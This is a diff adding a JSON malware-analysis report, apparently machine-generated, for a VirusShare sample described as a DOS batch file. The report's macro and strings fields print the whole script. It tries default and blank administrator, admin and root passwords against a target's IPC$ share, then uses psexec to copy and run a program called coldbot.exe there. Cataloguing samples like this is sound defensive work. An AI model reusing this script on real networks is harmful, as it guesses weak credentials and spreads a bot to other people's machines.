@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "@echo off\nnet use /del \\\\%1\\ipc$\nnet use \\\\%1\\ipc$ \"\" /user:administrator\nnet use \\\\%1\\ipc$ \"\" /user:Administrator\nnet use \\\\%1\\ipc$ \"admin\" /user:Administrator\nnet use \\\\%1\\ipc$ \"admin\" /user:administrator\nnet use \\\\%1\\ipc$ \"password\" /user:administrator\nnet use \\\\%1\\ipc$ \"password\" /user:Administrator\nnet use \\\\%1\\ipc$ \"12345\" /user:Administrator\nnet use \\\\%1\\ipc$ \"1\" /user:Administrator\nnet use \\\\%1\\ipc$ \"administrator\" /user:administrator\nnet use \\\\%1\\ipc$ \"root\" /user:root\nnet use \\\\%1\\ipc$ \"admin\" /user:admin\npsexec \\\\%1 attrib.exe -r coldbot.exe\npsexec \\\\%1 -f -c -d coldbot.exe -o\npsexec \\\\%1 -d coldbot.exe -o"
+    },
+    "filename": "VirusShare_9cc7108ec7897f43d72bdc3c934bc90d",
+    "filesize": 641,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "9cc7108ec7897f43d72bdc3c934bc90d",
+        "sha1": "f081942eec549f97fa715136d20a981c26a44cb8",
+        "sha256": "417028ffe0afe5e7b2086834018b2c515179660e519f7544c3d4ec65a3a031e9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "net use /del \\\\%1\\ipc$",
+            "net use \\\\%1\\ipc$ \"\" /user:administrator",
+            "net use \\\\%1\\ipc$ \"\" /user:Administrator",
+            "net use \\\\%1\\ipc$ \"admin\" /user:Administrator",
+            "net use \\\\%1\\ipc$ \"admin\" /user:administrator",
+            "net use \\\\%1\\ipc$ \"password\" /user:administrator",
+            "net use \\\\%1\\ipc$ \"password\" /user:Administrator",
+            "net use \\\\%1\\ipc$ \"12345\" /user:Administrator",
+            "net use \\\\%1\\ipc$ \"1\" /user:Administrator",
+            "net use \\\\%1\\ipc$ \"administrator\" /user:administrator",
+            "net use \\\\%1\\ipc$ \"root\" /user:root",
+            "net use \\\\%1\\ipc$ \"admin\" /user:admin",
+            "psexec \\\\%1 attrib.exe -r coldbot.exe",
+            "psexec \\\\%1 -f -c -d coldbot.exe -o",
+            "psexec \\\\%1 -d coldbot.exe -o"
+        ],
+        "file": {
+            "psexec \\\\%1 attrib.exe -r coldbot.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.287310",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
